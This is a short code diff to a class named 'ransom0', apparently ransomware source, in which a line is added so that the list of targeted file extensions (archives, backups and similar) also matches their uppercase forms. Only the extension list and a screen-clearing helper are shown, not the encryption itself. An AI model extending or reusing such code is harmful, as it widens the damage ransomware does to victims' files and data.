@@ -84,8 +84,7 @@ class ransom0:
         '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
             )
 
-
-
+    EXTENSIONS += tuple(map(lambda s: s.upper(), EXTENSIONS))
 
     def clear(self): 
         subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
